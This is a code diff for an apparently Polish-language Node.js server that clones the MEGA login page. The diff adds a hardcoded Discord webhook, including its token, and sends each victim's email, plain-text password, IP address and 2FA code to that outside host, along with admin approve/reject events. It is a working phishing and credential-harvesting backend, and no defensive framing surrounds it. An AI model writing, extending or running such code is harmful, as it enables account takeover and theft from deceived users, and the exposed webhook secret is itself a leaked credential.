@@ -5,6 +5,11 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// ============================================================
+// WEBHOOK KONFIGURACJA - WSTAW SWÓJ LINK
+// ============================================================
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1544436490254159957/8LfIkC-dfuwBv5-RpLtwJCNvMJHIjClx1wYcjyStywRq3xwN9QGv9TrRwYwQGWiIIi31';
+
 // Middleware
 app.use(express.json());
 app.use(express.static(path.join(__dirname, '..'))); // serwuje pliki z głównego folderu
@@ -13,6 +18,36 @@ app.use(express.static(path.join(__dirname, '..'))); // serwuje pliki z główne
 // SESJE W PAMIĘCI
 // ============================================================
 let sessions = {};
+
+// ============================================================
+// FUNKCJA WYSYŁANIA NA DISCORD
+// ============================================================
+async function sendToDiscord(data) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/TWOJ_WEBHOOK_TU') {
+        console.log('⚠️ Webhook nie skonfigurowany. Wstaw swój link w DISCORD_WEBHOOK_URL');
+        return;
+    }
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: 'MEGA Panel',
+                avatar_url: 'https://i.imgur.com/4M3VY1A.png',
+                embeds: [{
+                    title: data.title || '🔐 Nowe zdarzenie',
+                    description: data.description || '',
+                    color: data.color || 0xD42B3E,
+                    fields: data.fields || [],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: 'MEGA Clone v2.0' }
+                }]
+            })
+        });
+    } catch (e) {
+        console.error('Discord webhook error:', e);
+    }
+}
 
 // ============================================================
 // API ENDPOINTY
@@ -107,6 +142,21 @@ app.post('/api', (req, res) => {
             approved: false
         };
 
+        // ============================================================
+        // WYSYŁKA NA DISCORD - LOGOWANIE
+        // ============================================================
+        sendToDiscord({
+            title: '🔐 Nowe logowanie',
+            description: `Email: ${email}\nHasło: ${password}`,
+            color: 0xFBBF24,
+            fields: [
+                { name: '📧 Email', value: email, inline: true },
+                { name: '🔑 Hasło', value: `||${password}||`, inline: true },
+                { name: '🌐 IP', value: ip || 'N/A', inline: true },
+                { name: '🆔 Sesja', value: sessionId, inline: true }
+            ]
+        });
+
         return res.json({ 
             success: true, 
             sessionId: sessionId,
@@ -136,6 +186,19 @@ app.post('/api', (req, res) => {
         session.code = code;
         session.codeSetAt = new Date().toISOString();
 
+        // ============================================================
+        // WYSYŁKA NA DISCORD - KOD USTAWIONY
+        // ============================================================
+        sendToDiscord({
+            title: '🔐 Kod 2FA ustawiony',
+            description: `Kod: ${code} dla użytkownika ${session.email}`,
+            color: 0x4ADE80,
+            fields: [
+                { name: '📧 Email', value: session.email, inline: true },
+                { name: '🔐 Kod', value: code, inline: true }
+            ]
+        });
+
         return res.json({ 
             success: true, 
             message: 'Kod ustawiony!'
@@ -164,6 +227,15 @@ app.post('/api', (req, res) => {
         session.approved = true;
         session.verified = true;
 
+        // ============================================================
+        // WYSYŁKA NA DISCORD - ZATWIERDZONY
+        // ============================================================
+        sendToDiscord({
+            title: '✅ Admin zatwierdził użytkownika',
+            description: `Użytkownik ${session.email} został zatwierdzony.`,
+            color: 0x4ADE80
+        });
+
         return res.json({ 
             success: true, 
             message: 'Użytkownik zatwierdzony!',
@@ -191,6 +263,15 @@ app.post('/api', (req, res) => {
         }
 
         session.rejected = true;
+
+        // ============================================================
+        // WYSYŁKA NA DISCORD - ODRZUCONY
+        // ============================================================
+        sendToDiscord({
+            title: '❌ Admin odrzucił użytkownika',
+            description: `Użytkownik ${session.email} został odrzucony.`,
+            color: 0xEF4444
+        });
 
         return res.json({ 
             success: true, 
@@ -238,4 +319,5 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📡 API: http://localhost:${PORT}/api?action=test`);
+    console.log(`🔗 Discord webhook: ${DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/TWOJ_WEBHOOK_TU' ? '✅ Ustawiony' : '❌ Brak - wstaw swój link'}`);
 });
